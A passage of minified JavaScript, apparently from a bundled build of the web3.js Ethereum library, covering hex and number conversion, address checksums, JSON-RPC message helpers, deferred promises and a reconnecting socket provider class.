            Rs = Fr,
            Ms = Ns,
            js = e => {
                ps.validate(["string"], [e]);
                let t = "";
                for (let n = 0; n < e.length; n += 1) {
                    const r = e.charCodeAt(n).toString(16);
                    t += r.length % 2 !== 0 ? "0".concat(r) : r
                }
                return "0x".concat(t)
            },
            Fs = js,
            Ls = e => new TextDecoder("ascii").decode(ks(e)),
            Ds = Ls,
            Hs = (e, t) => {
                if ("string" === typeof e && Ya(e)) return t ? "address" : "0x".concat(e.toLowerCase().replace(/^0x/i, ""));
                if ("boolean" === typeof e) return t ? "bool" : e ? "0x01" : "0x00";
                if ("number" === typeof e) return t ? e < 0 ? "int256" : "uint256" : Cs(e);
                if ("bigint" === typeof e) return t ? "bigint" : Cs(e);
                if (ms(e)) return t ? "bytes" : As(e);
                if ("object" === typeof e && e) return t ? "string" : Ps(JSON.stringify(e));
                if ("string" === typeof e) {
                    if (e.startsWith("-0x") || e.startsWith("-0X")) return t ? "int256" : Cs(e);
                    if (_a(e)) return t ? "bytes" : e;
                    if (Pa(e) && !es(e) && !$a(e)) return t ? "bytes" : "0x".concat(e);
                    if (Pa(e) && !es(e) && $a(e)) return t ? "uint" : Cs(e);
                    if (!Number.isFinite(e)) return t ? "string" : Ps(e)
                }
                throw new Yn(e)
            },
            Us = e => {
                if ("number" === typeof e) return e > 1e20 ? (console.warn(bs), BigInt(e)) : e;
                if ("bigint" === typeof e) return e >= Number.MIN_SAFE_INTEGER && e <= Number.MAX_SAFE_INTEGER ? Number(e) : e;
                if ("string" === typeof e && _a(e)) return Es(e);
                try {
                    return Us(BigInt(e))
                } catch (ol) {
                    throw new Wn(e)
                }
            },
            zs = e => {
                if ("number" === typeof e) return BigInt(e);
                if ("bigint" === typeof e) return e;
                if ("string" === typeof e && Pa(e)) return e.startsWith("-") ? -BigInt(e.substring(1)) : BigInt(e);
                throw new Wn(e)
            },
            Gs = (e, t) => {
                let n;
                if ("string" === typeof t) {
                    if (n = ys[t], !n) throw new Kn(t)
                } else {
                    if (t < 0 || !Number.isInteger(t)) throw new Jn(t);
                    n = Xa(BigInt(10), BigInt(t))
                }
                const r = String(Us(e)),
                    i = n.toString().length - 1;
                if (i <= 0) return r.toString();
                const o = r.padStart(i, "0"),
                    a = o.slice(0, -i),
                    s = o.slice(-i).replace(/\.?0+$/, "");
                if ("" === a) return "0.".concat(s);
                if ("" === s) return a;
                return "".concat(a, ".").concat(s).slice(0, a.length + i + 1)
            },
            qs = (e, t) => {
                let n;
                if (ps.validate(["number"], [e]), "string" === typeof t) {
                    if (n = ys[t], !n) throw new Kn(t)
                } else {
                    if (t < 0 || !Number.isInteger(t)) throw new Jn(t);
                    n = Xa(BigInt(10), BigInt(t))
                }
                let r = e;
                "number" === typeof r && (r < 1e-15 && console.warn(bs), r > 1e20 ? (console.warn(bs), r = BigInt(r)) : r = r.toLocaleString("fullwide", {
                    useGrouping: !1,
                    maximumFractionDigits: 20
                }));
                const [i, o] = String("string" !== typeof r || _a(r) ? Us(r) : r).split(".").concat(""), a = BigInt("".concat(i).concat(o)) * n, s = o.length;
                return 0 === s ? a.toString() : a.toString().slice(0, -s)
            },
            Qs = e => {
                if (!Ya(e, !1)) throw new Vn(e);
                const t = e.toLowerCase().replace(/^0x/i, ""),
                    n = Ga(hi(Va(Rs(t))));
                if (ss(n) || "0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470" === n) return "";
                let r = "0x";
                const i = n.replace(/^0x/i, "");
                for (let o = 0; o < t.length; o += 1) parseInt(i[o], 16) > 7 ? r += t[o].toUpperCase() : r += t[o];
                return r
            },
            Ws = e => {
                if ("boolean" === typeof e) return e;
                if ("number" === typeof e && (0 === e || 1 === e)) return Boolean(e);
                if ("bigint" === typeof e && (e === BigInt(0) || e === BigInt(1))) return Boolean(e);
                if ("string" === typeof e && !_a(e) && ("1" === e || "0" === e || "false" === e || "true" === e)) return "true" === e || "false" !== e && Boolean(Number(e));
                if ("string" === typeof e && _a(e) && ("0x1" === e || "0x0" === e)) return Boolean(Us(e));
                throw new $n(e)
            };
        var Vs = n(926);
        const Zs = Vs;
        class Ks extends Zs {
            constructor() {
                super(...arguments), this.maxListeners = Number.MAX_SAFE_INTEGER
            }
            setMaxListeners(e) {
                return this.maxListeners = e, this
            }
            getMaxListeners() {
                return this.maxListeners
            }
        }
        const Js = _a,
            Ys = Pa,
            Xs = Ja,
            $s = Ya,
            ec = os,
            tc = as,
            nc = (e, t) => {
                if (!os(e)) return !1;
                if (!Ya(t)) return !1;
                const n = za(t, 64);
                return as(e, n)
            },
            rc = (e, t) => !!os(e) && (!!Ya(t) && as(e, t)),
            ic = ls,
            oc = (e, t) => !!os(e) && (!!ls(t) && as(e, t)),
            ac = (e, t) => {
                const n = "string" === typeof e && rs(e),
                    r = "string" === typeof t && rs(t);
                if (e === t || ("earliest" === e || 0 === e) && ("earliest" === t || 0 === t)) return 0;
                if ("earliest" === e && t > 0) return -1;
                if ("earliest" === t && e > 0) return 1;
                if (n && r) {
                    const n = {
                        [et.EARLIEST]: 1,
                        [et.FINALIZED]: 2,
                        [et.SAFE]: 3,
                        [et.LATEST]: 4,
                        [et.PENDING]: 5
                    };
                    return n[e] < n[t] ? -1 : 1
                }
                if (n && !r || !n && r) throw new rr("Cannot compare blocktag with provided non-blocktag input.");
                const i = BigInt(e),
                    o = BigInt(t);
                return i < o ? -1 : i === o ? 0 : 1
            },
            sc = e => "object" === typeof e && !ss(e) && 0 !== Object.keys(e).length && ["input", "data", "from", "gas", "gasPrice", "gasLimit", "address", "jsonInterface", "syncWithContext", "dataInputFill"].some((t => t in e)),
            cc = ss,
            lc = e => "object" === typeof e && !ss(e) && !Array.isArray(e) && !(e instanceof nt),
            uc = function(e) {
                if (!lc(e)) return e;
                const t = Object.assign({}, e);
                for (var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++) r[i - 1] = arguments[i];
                for (const o of r)
                    for (const e in o) lc(o[e]) ? (t[e] || (t[e] = {}), t[e] = uc(t[e], o[e])) : !ss(o[e]) && Object.hasOwnProperty.call(o, e) && (Array.isArray(o[e]) || o[e] instanceof nt ? t[e] = o[e].slice(0) : t[e] = o[e]);
                return t
            },
            dc = function(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "0";
                return "string" === typeof e ? _a(e) ? za(e, t, n) : e.padStart(t, n) : (ps.validate(["int"], [e]), za(e, t, n))
            },
            fc = function(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "0";
                if ("string" === typeof e && !_a(e)) return e.padEnd(t, n);
                ps.validate(["int"], [e]);
                const r = "string" === typeof e && _a(e) ? e : Cs(e),
                    i = r.startsWith("-") ? 3 : 2;
                return r.padEnd(t + i, n)
            },
            hc = fc,
            pc = dc,
            mc = function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 64;
                ps.validate(["int"], [e]);
                const n = Us(e);
                if (n >= 0) return dc(Hs(n), t);
                const r = Xa(BigInt(2), BigInt(4 * t));
                if (-n >= r) throw new Xn("value: ".concat(e, ", nibbleWidth: ").concat(t));
                const i = BigInt(n);
                return dc(Cs(i + r), t)
            },
            gc = function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 64;
                ps.validate(["int"], [e]);
                const n = Us(e);
                if (n < 0) return n;
                const r = Math.ceil(Math.log(Number(n)) / Math.log(2));
                if (r > 4 * t) throw new Xn('value: "'.concat(e, '", nibbleWidth: "').concat(t, '"'));
                if (4 * t !== r) return n;
                const i = Xa(BigInt(2), BigInt(t) * BigInt(4));
                return Us(BigInt(n) - i)
            },
            {
                parseBaseType: vc
            } = e,
            yc = e => "object" === typeof e && !ss(e) && "number" in e && "bytes" in e,
            bc = function(e, t) {
                let n, r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : [],
                    i = Object.assign({}, e);
                for (const o of t) {
                    if (i.oneOf && n) {
                        const e = n,
                            t = r.find((t => {
                                let [n] = t;
                                return n === e
                            }));
                        t && t[0] === n && (i = i.oneOf[t[1]])
                    }
                    if (!i.properties && !i.items) return;
                    if (i.properties) i = i.properties[o];
                    else if (i.items && i.items.properties) {
                        i = i.items.properties[o]
                    } else i.items && cs(i.items) ? i = i.items : i.items && Array.isArray(i.items) && (i = i.items[parseInt(o, 10)]);
                    i && o && (n = o)
                }
                return i
            },
            wc = (e, t, n) => {
                try {
                    const {
                        baseType: r,
                        baseTypeSize: i
                    } = vc(t);
                    if ("int" === r || "uint" === r) switch (n.number) {
                        case Je.NUMBER:
                            return Number(zs(e));
                        case Je.HEX:
                            return Cs(zs(e));
                        case Je.STR:
                            return zs(e).toString();
                        case Je.BIGINT:
                            return zs(e);
                        default:
                            throw new Kt("Invalid format: ".concat(String(n.number)))
                    }
                    if ("bytes" === r) {
                        let t;
                        switch (i ? "string" === typeof e ? t = dc(e, 2 * i) : ms(e) && (t = gs(new Uint8Array(i - e.length), e)) : t = e, n.bytes) {
                            case Ye.HEX:
                                return As(ws(t));
                            case Ye.UINT8ARRAY:
                                return ws(t);
                            default:
                                throw new Kt("Invalid format: ".concat(String(n.bytes)))
                        }
                    }
                } catch (r) {
                    return e
                }
                return e
            },
            xc = e => {
                let {
                    value: t,
                    schemaProp: n,
                    schema: r,
                    object: i,
                    key: o,
                    dataPath: a,
                    format: s,
                    oneOfPath: c = []
                } = e;
                var l, u;
                if (Array.isArray(t)) {
                    let e = n;
                    if (void 0 !== (null === n || void 0 === n ? void 0 : n.oneOf) && n.oneOf.forEach(((r, i) => {
                            var a, s;
                            !Array.isArray(null === n || void 0 === n ? void 0 : n.items) && ("object" === typeof t[0] && "object" === (null === (a = null === r || void 0 === r ? void 0 : r.items) || void 0 === a ? void 0 : a.type) || "string" === typeof t[0] && "object" !== (null === (s = null === r || void 0 === r ? void 0 : r.items) || void 0 === s ? void 0 : s.type)) && (e = r, c.push([o, i]))
                        })), ss(null === e || void 0 === e ? void 0 : e.items)) return delete i[o], a.pop(), !0;
                    if (cs(e.items) && !ss(e.items.format)) {
                        for (let n = 0; n < t.length; n += 1) i[o][n] = wc(t[n], null === (l = null === e || void 0 === e ? void 0 : e.items) || void 0 === l ? void 0 : l.format, s);
                        return a.pop(), !0
                    }
                    if (!Array.isArray(null === e || void 0 === e ? void 0 : e.items) && "object" === (null === (u = null === e || void 0 === e ? void 0 : e.items) || void 0 === u ? void 0 : u.type)) {
                        for (const e of t) Ac(e, r, a, s, c);
                        return a.pop(), !0
                    }
                    if (Array.isArray(null === e || void 0 === e ? void 0 : e.items)) {
                        for (let n = 0; n < t.length; n += 1) i[o][n] = wc(t[n], e.items[n].format, s);
                        return a.pop(), !0
                    }
                }
                return !1
            },
            Ac = function(e, t, n, r) {
                let i = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : [];
                var o;
                if (!cs(e) && !Array.isArray(e)) return wc(e, null === t || void 0 === t ? void 0 : t.format, r);
                const a = e;
                if (Array.isArray(a) && "array" === (null === t || void 0 === t ? void 0 : t.type) && "object" === (null === (o = null === t || void 0 === t ? void 0 : t.items) || void 0 === o ? void 0 : o.type)) xc({
                    value: a,
                    schemaProp: t,
                    schema: t,
                    object: a,
                    key: "",
                    dataPath: n,
                    format: r,
                    oneOfPath: i
                });
                else
                    for (const [s, c] of Object.entries(a)) {
                        n.push(s);
                        const e = bc(t, n, i);
                        ss(e) ? (delete a[s], n.pop()) : cs(c) ? (Ac(c, t, n, r, i), n.pop()) : xc({
                            value: c,
                            schemaProp: e,
                            schema: t,
                            object: a,
                            key: s,
                            dataPath: n,
                            format: r,
                            oneOfPath: i
                        }) || (a[s] = wc(c, e.format, r), n.pop())
                    }
                return a
            },
            kc = function(e, t) {
                let n, r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : Xe;
                n = cs(t) ? uc({}, t) : Array.isArray(t) ? [...t] : t;
                const i = cs(e) ? e : ja(e);
                if (!i.properties && !i.items && !i.format) throw new Kt("Invalid json schema for formatting");
                return Ac(n, i, [], r)
            },
            Ec = "0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
            Sc = e => {
                let t;
                return t = "bigint" === typeof e || "number" === typeof e ? Fr(e.toString()) : Array.isArray(e) ? new Uint8Array(e) : "string" !== typeof e || _a(e) ? ws(e) : Fr(e), As(hi(Va(t)))
            },
            Cc = e => {
                let t;
                t = "string" === typeof e ? e.startsWith("0x") && _a(e) ? ks(e) : Fr(e) : e;
                const n = Sc(t);
                return n === Ec ? void 0 : n
            },
            _c = e => {
                const t = Cc(e);
                return ss(t) ? Ec : t
            },
            Ic = (e, t) => {
                const n = /^(\d+).*$/.exec(e.slice(t));
                return n ? parseInt(n[1], 10) : 0
            },
            Pc = e => e.toString(2).length,
            Tc = (e, t) => {
                const n = t.toString();
                if ("string" === e) {
                    if ("string" === typeof t) return Ps(t);
                    throw new Zn(t)
                }
                if ("bool" === e || "boolean" === e) {
                    if ("boolean" === typeof t) return t ? "01" : "00";
                    throw new $n(t)
                }
                if ("address" === e) {
                    if (!Ya(n)) throw new Vn(n);
                    return n
                }
                const r = (e => e.startsWith("int[") ? "int256".concat(e.slice(3)) : "int" === e ? "int256" : e.startsWith("uint[") ? "uint256'".concat(e.slice(4)) : "uint" === e ? "uint256" : e)(e);
                if (e.startsWith("uint")) {
                    const e = Ic(r, 4);
                    if (e % 8 || e < 8 || e > 256) throw new tr(n);
                    const t = Us(n);
                    if (Pc(t) > e) throw new nr(n);
                    if (t < BigInt(0)) throw new er(n);
                    return e ? pc(t.toString(16), e / 8 * 2) : t.toString(16)
                }
                if (e.startsWith("int")) {
                    const t = Ic(r, 3);
                    if (t % 8 || t < 8 || t > 256) throw new tr(e);
                    const i = Us(n);
                    if (Pc(i) > t) throw new nr(n);
                    return i < BigInt(0) ? mc(i.toString(), t / 8 * 2) : t ? pc(i.toString(16), t / 4) : i.toString(16)
                }
                if ("bytes" === r) {
                    if (n.replace(/^0x/i, "").length % 2 !== 0) throw new Qn(n);
                    return n
                }
                if (e.startsWith("bytes")) {
                    if (n.replace(/^0x/i, "").length % 2 !== 0) throw new Qn(n);
                    const t = Ic(e, 5);
                    if (!t || t < 1 || t > 64 || t < n.replace(/^0x/i, "").length / 2) throw new Qn(n);
                    return hc(n, 2 * t)
                }
                return ""
            },
            Bc = e => {
                const [t, n] = (e => {
                    if (Array.isArray(e)) throw new Error("Autodetection of array types is not supported.");
                    let t, n;
                    if ("object" === typeof e && ("t" in e || "type" in e) && ("v" in e || "value" in e)) t = "t" in e ? e.t : e.type, n = "v" in e ? e.v : e.value, t = "bigint" === t.toLowerCase() ? "int" : t;
                    else {
                        if ("bigint" === typeof e) return ["int", e];
                        t = Hs(e, !0), n = Hs(e), t.startsWith("int") || t.startsWith("uint") || (t = "bytes")
                    }
                    return !t.startsWith("int") && !t.startsWith("uint") || "string" !== typeof n || /^(-)?0x/i.test(n) || (n = zs(n)), [t, n]
                })(e);
                if (Array.isArray(n)) {
                    const e = n.map((e => Tc(t, e).replace("0x", "")));
                    return e.join("")
                }
                return Tc(t, n).replace("0x", "")
            },
            Nc = function() {
                for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                const r = t.map(Bc);
                return "0x".concat(r.join("").toLowerCase())
            },
            Oc = function() {
                return Cc(Nc(...arguments))
            },
            Rc = function() {
                return _c(Nc(...arguments))
            },
            Mc = e => Cc("0x".concat(("number" === typeof e ? e.toString() : e).padStart(64, "0")));
        const jc = e => function(e) {
                return qr(e)
            }(e),
            Fc = e => As(jc(e));
        var Lc = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };

        function Dc(e) {
            return ("object" === typeof e || "function" === typeof e) && "function" === typeof e.then
        }

        function Hc(e, t, n) {
            return Lc(this, void 0, void 0, (function*() {
                let r;
                const i = yield Promise.race([e instanceof Promise ? e : e(), new Promise(((e, i) => {
                    r = setTimeout((() => n ? i(n) : e(void 0)), t)
                }))]);
                if (r && clearTimeout(r), i instanceof Error) throw i;
                return i
            }))
        }

        function Uc(e, t) {
            let n;
            return [new Promise(((r, i) => {
                n = setInterval(function o() {
                    return (() => {
                        Lc(this, void 0, void 0, (function*() {
                            try {
                                const i = yield Hc(e, t);
                                ss(i) || (clearInterval(n), r(i))
                            } catch (o) {
                                clearInterval(n), i(o)
                            }
                        }))
                    })(), o
                }(), t)
            })), n]
        }

        function zc(e, t) {
            return Lc(this, void 0, void 0, (function*() {
                return Uc(e, t)[0]
            }))
        }

        function Gc(e, t) {
            let n;
            const r = new Promise(((r, i) => {
                n = setTimeout((() => {
                    i(t)
                }), e)
            }));
            return [n, r]
        }

        function qc(e, t) {
            let n;
            const r = new Promise(((r, i) => {
                n = setInterval((() => {
                    (() => {
                        Lc(this, void 0, void 0, (function*() {
                            const t = yield e();
                            t && (clearInterval(n), i(t))
                        }))
                    })()
                }), t)
            }));
            return [n, r]
        }
        const Qc = () => {
                const e = jc(16);
                e[6] = 15 & e[6] | 64, e[8] = 63 & e[8] | 128;
                const t = As(e);
                return [t.substring(2, 10), t.substring(10, 14), t.substring(14, 18), t.substring(18, 22), t.substring(22, 34)].join("-")
            },
            Wc = e => {
                const t = e.error.code;
                return hr.has(t) || t >= -32099 && t <= -32e3
            },
            Vc = e => !Array.isArray(e) && !!e && "2.0" === e.jsonrpc && "result" in e && ss(e.error) && ("number" === typeof e.id || "string" === typeof e.id),
            Zc = e => !Array.isArray(e) && "2.0" === e.jsonrpc && !!e && ss(e.result) && "error" in e && ("number" === typeof e.id || "string" === typeof e.id),
            Kc = e => !Array.isArray(e) && !!e && "2.0" === e.jsonrpc && !ss(e.params) && !ss(e.method),
            Jc = e => !Array.isArray(e) && !!e && "2.0" === e.jsonrpc && "id" in e && "result" in e,
            Yc = e => Vc(e) || Zc(e),
            Xc = e => Array.isArray(e) ? e.every(Yc) : Yc(e),
            $c = e => Array.isArray(e) && e.length > 0 && Xc(e);
        let el;
        const tl = e => {
                el = e
            },
            nl = e => {
                var t, n, r, i;
                return "undefined" !== typeof el && (el += 1), {
                    jsonrpc: null !== (t = e.jsonrpc) && void 0 !== t ? t : "2.0",
                    id: null !== (r = null !== (n = e.id) && void 0 !== n ? n : el) && void 0 !== r ? r : Qc(),
                    method: e.method,
                    params: null !== (i = e.params) && void 0 !== i ? i : void 0
                }
            },
            rl = e => e.map((e => nl(e))),
            il = e => Array.isArray(e) && e.length > 0;
        var ol, al = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class sl {
            constructor() {
                let {
                    timeout: e,
                    eagerStart: t,
                    timeoutMessage: n
                } = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {
                    timeout: 0,
                    eagerStart: !1,
                    timeoutMessage: "DeferredPromise timed out"
                };
                this[ol] = "Promise", this._state = "pending", this._promise = new Promise(((e, t) => {
                    this._resolve = e, this._reject = t
                })), this._timeoutMessage = n, this._timeoutInterval = e, t && this.startTimer()
            }
            get state() {
                return this._state
            }
            then(e, t) {
                return al(this, void 0, void 0, (function*() {
                    return this._promise.then(e, t)
                }))
            } catch (e) {
                return al(this, void 0, void 0, (function*() {
                    return this._promise.catch(e)
                }))
            } finally(e) {
                return al(this, void 0, void 0, (function*() {
                    return this._promise.finally(e)
                }))
            }
            resolve(e) {
                this._resolve(e), this._state = "fulfilled", this._clearTimeout()
            }
            reject(e) {
                this._reject(e), this._state = "rejected", this._clearTimeout()
            }
            startTimer() {
                this._timeoutInterval && this._timeoutInterval > 0 && (this._timeoutId = setTimeout(this._checkTimeout.bind(this), this._timeoutInterval))
            }
            _checkTimeout() {
                "pending" === this._state && this._timeoutId && this.reject(new Yt(this._timeoutMessage))
            }
            _clearTimeout() {
                this._timeoutId && clearTimeout(this._timeoutId)
            }
        }
        ol = Symbol.toStringTag;
        class cl {
            constructor(e, t) {
                this.eventEmitter = e, this.autoReconnect = t, this.chunkTimeout = 15e3
            }
            clearQueues() {
                "function" === typeof this._clearQueues && this._clearQueues()
            }
            onError(e) {
                this._clearQueues = e
            }
            parseResponse(e) {
                const t = [];
                return e.replace(/\}[\n\r]?\{/g, "}|--|{").replace(/\}\][\n\r]?\[\{/g, "}]|--|[{").replace(/\}[\n\r]?\[\{/g, "}|--|[{").replace(/\}\][\n\r]?\{/g, "}]|--|{").split("|--|").forEach((e => {
                    let n, r = e;
                    this.lastChunk && (r = this.lastChunk + r);
                    try {
                        n = JSON.parse(r)
                    } catch (Qy) {
                        return this.lastChunk = r, this.lastChunkTimeout && clearTimeout(this.lastChunkTimeout), void(this.lastChunkTimeout = setTimeout((() => {
                            this.autoReconnect || (this.clearQueues(), this.eventEmitter.emit("error", new ar({
                                id: 1,
                                jsonrpc: "2.0",
                                error: {
                                    code: 2,
                                    message: "Chunk timeout"
                                }
                            })))
                        }), this.chunkTimeout))
                    }
                    clearTimeout(this.lastChunkTimeout), this.lastChunk = void 0, n && t.push(n)
                })), t
            }
        }
        var ll = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class ul extends ot {
            constructor() {
                super(...arguments), this._eventEmitter = new Vs, this._chainId = "", this._accounts = []
            }
            _getChainId() {
                var e;
                return ll(this, void 0, void 0, (function*() {
                    const t = yield this.request(nl({
                        method: "eth_chainId",
                        params: []
                    }));
                    return null !== (e = null === t || void 0 === t ? void 0 : t.result) && void 0 !== e ? e : ""
                }))
            }
            _getAccounts() {
                var e;
                return ll(this, void 0, void 0, (function*() {
                    const t = yield this.request(nl({
                        method: "eth_accounts",
                        params: []
                    }));
                    return null !== (e = null === t || void 0 === t ? void 0 : t.result) && void 0 !== e ? e : []
                }))
            }
            _onConnect() {
                Promise.all([this._getChainId().then((e => {
                    e !== this._chainId && (this._chainId = e, this._eventEmitter.emit("chainChanged", this._chainId))
                })).catch((e => {
                    console.error(e)
                })), this._getAccounts().then((e => {
                    this._accounts.length === e.length && e.every((t => e.includes(t))) || (this._accounts = e, this._onAccountsChanged())
                })).catch((e => {
                    console.error(e)
                }))]).then((() => this._eventEmitter.emit("connect", {
                    chainId: this._chainId
                }))).catch((e => {
                    console.error(e)
                }))
            }
            _onDisconnect(e, t) {
                this._eventEmitter.emit("disconnect", new fr(e, t))
            }
            _onAccountsChanged() {
                this._eventEmitter.emit("accountsChanged", this._accounts)
            }
        }
        var dl = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        const fl = {
            autoReconnect: !0,
            delay: 5e3,
            maxAttempts: 5
        };
        class hl extends ul {
            constructor(e, t, n) {
                if (super(), this._connectionStatus = "connecting", this._onMessageHandler = this._onMessage.bind(this), this._onOpenHandler = this._onConnect.bind(this), this._onCloseHandler = this._onCloseEvent.bind(this), this._onErrorHandler = this._onError.bind(this), !this._validateProviderPath(e)) throw new nn(e);
                this._socketPath = e, this._socketOptions = t, this._reconnectOptions = Object.assign(Object.assign({}, fl), null !== n && void 0 !== n ? n : {}), this._pendingRequestsQueue = new Map, this._sentRequestsQueue = new Map, this._init(), this.connect(), this.chunkResponseParser = new cl(this._eventEmitter, this._reconnectOptions.autoReconnect), this.chunkResponseParser.onError((() => {
                    this._clearQueues()
                })), this.isReconnecting = !1
            }
            get SocketConnection() {
                return this._socketConnection
            }
            _init() {
                this._reconnectAttempts = 0
            }
            connect() {
                try {
                    this._openSocketConnection(), this._connectionStatus = "connecting", this._addSocketListeners()
                } catch (Qy) {
                    if (!this.isReconnecting) throw this._connectionStatus = "disconnected", Qy && Qy.message ? new jt("Error while connecting to ".concat(this._socketPath, ". Reason: ").concat(Qy.message)) : new nn(this._socketPath);
                    setImmediate((() => {
                        this._reconnect()
                    }))
                }
            }
            _validateProviderPath(e) {
                return !!e
            }
            getPendingRequestQueueSize() {
                return this._pendingRequestsQueue.size
            }
            getSentRequestsQueueSize() {
                return this._sentRequestsQueue.size
            }
            supportsSubscriptions() {
                return !0
            }
            on(e, t) {
                this._eventEmitter.on(e, t)
            }
            once(e, t) {
                this._eventEmitter.once(e, t)
            }
            removeListener(e, t) {
                this._eventEmitter.removeListener(e, t)
            }
            _onDisconnect(e, t) {
                this._connectionStatus = "disconnected", super._onDisconnect(e, t)
            }
            disconnect(e, t) {
                const n = null !== e && void 0 !== e ? e : 1e3;
                this._removeSocketListeners(), "disconnected" !== this.getStatus() && this._closeSocketConnection(n, t), this._onDisconnect(n, t)
            }
            safeDisconnect(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
                    r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : 1e3;
                return dl(this, void 0, void 0, (function*() {
                    let i = 0;
                    yield(() => dl(this, void 0, void 0, (function*() {
                        return new Promise((e => {
                            const t = setInterval((() => {
                                n && i >= 5 && this.clearQueues(), 0 === this.getPendingRequestQueueSize() && 0 === this.getSentRequestsQueueSize() && (clearInterval(t), e(!0)), i += 1
                            }), r)
                        }))
                    })))(), this.disconnect(e, t)
                }))
            }
            removeAllListeners(e) {
                this._eventEmitter.removeAllListeners(e)
            }
            _onError(e) {
                this.isReconnecting ? this._reconnect() : this._eventEmitter.emit("error", e)
            }
            reset() {
                this._sentRequestsQueue.clear(), this._pendingRequestsQueue.clear(), this._init(), this._removeSocketListeners(), this._addSocketListeners()
            }
            _reconnect() {
                this.isReconnecting || (this.isReconnecting = !0, this._sentRequestsQueue.size > 0 && this._sentRequestsQueue.forEach(((e, t) => {
                    e.deferredPromise.reject(new Dt), this._sentRequestsQueue.delete(t)
                })), this._reconnectAttempts < this._reconnectOptions.maxAttempts ? (this._reconnectAttempts += 1, setTimeout((() => {
                    this._removeSocketListeners(), this.connect(), this.isReconnecting = !1
                }), this._reconnectOptions.delay)) : (this.isReconnecting = !1, this._clearQueues(), this._removeSocketListeners(), this._eventEmitter.emit("error", new Lt(this._reconnectOptions.maxAttempts))))
            }
            request(e) {
                return dl(this, void 0, void 0, (function*() {
                    if (cc(this._socketConnection)) throw new Error("Connection is undefined");
                    "disconnected" === this.getStatus() && this.connect();
                    const t = il(e) ? e[0].id : e.id;
                    if (!t) throw new on("Request Id not defined");
                    if (this._sentRequestsQueue.has(t)) throw new Ht(t);
                    const n = new sl;
                    n.catch((e => {
                        this._eventEmitter.emit("error", e)
                    }));
                    const r = {
                        payload: e,
                        deferredPromise: n
                    };
                    if ("connecting" === this.getStatus()) return this._pendingRequestsQueue.set(t, r), r.deferredPromise;
                    this._sentRequestsQueue.set(t, r);
                    try {
                        this._sendToSocket(r.payload)
                    } catch (i) {
                        this._sentRequestsQueue.delete(t), this._eventEmitter.emit("error", i)
                    }
                    return n
                }))
            }
            _onConnect() {
                this._connectionStatus = "connected", this._reconnectAttempts = 0, super._onConnect(), this._sendPendingRequests()
            }
            _sendPendingRequests() {
                for (const [t, n] of this._pendingRequestsQueue.entries()) try {
                    this._sendToSocket(n.payload), this._pendingRequestsQueue.delete(t), this._sentRequestsQueue.set(t, n)
                } catch (e) {
                    this._pendingRequestsQueue.delete(t), this._eventEmitter.emit("error", e)
                }
            }
            _onMessage(e) {
                const t = this._parseResponses(e);
                if (!cc(t) && 0 !== t.length)
                    for (const n of t) {
                        if (Kc(n) && n.method.endsWith("_subscription")) return void this._eventEmitter.emit("message", n);
                        const e = $c(n) ? n[0].id : n.id,
                            t = this._sentRequestsQueue.get(e);
                        if (!t) return;
                        ($c(n) || Vc(n) || Zc(n)) && (this._eventEmitter.emit("message", n), t.deferredPromise.resolve(n)), this._sentRequestsQueue.delete(e)
                    }
            }
            clearQueues(e) {
                this._clearQueues(e)
            }
            _clearQueues(e) {
                this._pendingRequestsQueue.size > 0 && this._pendingRequestsQueue.forEach(((t, n) => {
                    t.deferredPromise.reject(new Ft(e)), this._pendingRequestsQueue.delete(n)
                })), this._sentRequestsQueue.size > 0 && this._sentRequestsQueue.forEach(((t, n) => {
                    t.deferredPromise.reject(new Ft(e)), this._sentRequestsQueue.delete(n)
                })), this._removeSocketListeners()
            }
        }
        class pl {
            constructor() {
                this._emitter = new Ks
            }
            on(e, t) {
                this._emitter.on(e, t)
            }
            once(e, t) {
                this._emitter.once(e, t)
